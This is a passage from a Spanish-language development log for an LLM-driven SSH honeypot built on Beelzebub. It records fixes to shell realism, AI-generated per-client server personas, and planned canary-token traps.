  Añadir» que asigna puerto+persona). Spec en `wiki/diseno-despliegue.md` §9. Es la tanda de despliegue.
- Generar entornos para otras personas (Windows/Cisco) con el mismo generador.

---

## 28-ago-2026 (10ª tanda) — `ls` consistente + modal SSH como hub de personalidades

### Cerrado
- **`ls` vs `ls -lsa` ya coinciden.** El árbol del prompt no marcaba tipos; ahora marca **carpetas con
  `/`** y ficheros sin barra, con la regla «el conjunto de entradas de un directorio es FIJO — todos
  los formatos de `ls` muestran las MISMAS entradas». Además `cd` a un fichero → `Not a directory`.
  Se mantuvo `cd` **permisivo** (multinivel `cd projects/infra`, `cd ..`, absolutos). Verificado por
  SSH: `ls`/`ls -lsa` iguales, `cd terraform` entra y da sus `.tf`, `cd docker-compose.yml` → Not a
  directory.
- **Modal «Configurar SSH» = hub de personalidades.** Además de elegir persona y «Editar prompt…»,
  ahora tiene **«✨ Generar personalidad a medida (IA)»** inline: describes al cliente + nombre →
  genera el entorno (gpt-4o) → crea la persona → la selecciona → «Aplicar». Resuelve el «no se ve la
  personalidad»: se genera y aplica ahí mismo. Reusa `_idDesdeNombre` y `_loadServicePersonas`
  (factorizada). Verificado E2E (generar→crear→probar `ls` tematizado).
- Suite 1400 verde (sin cambios de backend).

### Honesto / pendiente
- El shell LLM sigue siendo ~90–95% (algún glitch puntual). En `ls` plano se muestran los `/` de
  carpeta (como `ls -F`) — leve, no se tocó para no romper la consistencia recién lograda.
- Trampas se deja como está (decisión de Iván); HTTP y sus personalidades, a probar después.
- Despliegue per-cliente (SSH por flock en su puerto) sigue agendado.

---

## 28-ago-2026 (11ª tanda) — Que la persona a medida SÍ se aplique + dirección del árbol

### Cerrado
- **«Aplicar» reinicia Beelzebub SOLO.** Antes escribía el YAML pero el reinicio era un botón aparte
  fácil de olvidar → el cambio no cargaba (la shell seguía prod-web-01). Ahora `applyPersona`,
  `applyPersonaToService` y `saveServiceLlm` llaman a `restartBeelzebub()` (watchdog, ≤60 s). Verificado
  E2E: tras aplicar una persona RH, `hostname` = RH-Server-Electro, `whoami` = jlopez, `ls` = árbol RH.
- **Generador robusto**: `generate-scenario` ahora compone ESCENARIO (LLM: hostname + árbol + usuarios +
  negocio) + REGLAS FIJAS afinadas (cd permisivo multinivel, consistencia de `ls`, tipos, contenido,
  anti-detección). Así toda persona generada trae comportamiento sólido; ya no «los mismos errores».
- **SSH LLM-first (puente)**: quitados los 61 handlers estáticos que fijaban prod-web-01 y chocaban con
  cualquier persona a medida. El prompt de la persona controla todo (hostname/usuarios/ficheros).
- **Contexto documentado**: el generador guarda el `scenario_context` en la descripción de la persona
  («Generado para: …»), visible en el editor.
- Suite 1400 verde.

### Dirección de fondo (diseñada, a construir): árbol «estáticos + a medida»
- Árbol de ficheros ESTÁTICO editable (determinista, ahorra tokens) + LLM encima (contenido/interacción)
  + plantillas por industria/departamento (IT/Seguridad/RH…), estilo Thinkst pero con IA. Diseño y
  fases en `wiki/diseno-despliegue.md` §10.

### Pendiente menor
- El banner SSH usa `serverName` del YAML (no cambia con la persona) → hostname del banner ≠ hostname
  del comando. Tematizar `serverName` al aplicar/construir la persona.

---

## 28-ago-2026 (cierre de sesión) — Pendiente: realismo del shell + constructor por árbol

Se cierra la sesión aquí para continuar en una nueva. Prompt de arranque detallado en
`wiki/prompt-siguiente-sesion.md`. Pendiente, en orden:

### Parte A — Realismo del shell SSH (empezar por aquí)
- **[P0] Persistir la clave de host SSH de Beelzebub** — mata el «REMOTE HOST IDENTIFICATION HAS
  CHANGED» (delator grave, agravado porque «Aplicar» reinicia). Investigar soporte en Beelzebub v3.9.0
  (ruta de clave fija + volumen escribible; hoy el mount es `:ro`). Requiere tocar compose (recreate,
  sin `down -v`). Si no hay soporte por config → evaluar fork/otra vía y consultar a Iván.
- **[P1] `cat`/`head`/`tail` de binario/PDF/docx** → volcar contenido, nunca meta/servicial.
- **[P1] Editores y pagers** (`nano`, `vi`, `vim`, `less`, `more`) → «abren» el fichero y vuelven al
  prompt, para retener al atacante. Cubrir todos los comandos que usaría un atacante.
- **[P1] Locale**: contenido en el idioma del país/empresa (español para México) y estructuras
  coherentes por industria (la de hospital CDMX salió en inglés y sin sentido).
- **[P2] serverName a medida** al aplicar la persona (banner == hostname).
- **[P2] Timestamps**: permitir fijar la época/fechas de los ficheros desde el prompt.

### Parte B — Constructor de entornos por árbol (visión de producto)
- Menús desplegables de **industria + departamento** (catálogo definido por nosotros) + 1 barra de
  personalización. Confirmar el catálogo con Iván antes de construir.
- **Vista/editor de árbol** de carpetas/archivos junto a la **shell de prueba** (probe).
- **Plantillas base** por industria/departamento, coherentes y en idioma correcto.
- **Integración canary tokens**: crear credenciales trampa y ubicarlas en el árbol (ruta indicada);
  el atacante las recolecta → alerta. Conectar con cebos / `/deploy/execute`.
- **Determinismo** del árbol (estructura de datos) para `ls`/`cd`; evaluar Cowrie si se necesita 100%.

Ver diseño en `wiki/diseno-despliegue.md` §9-10.
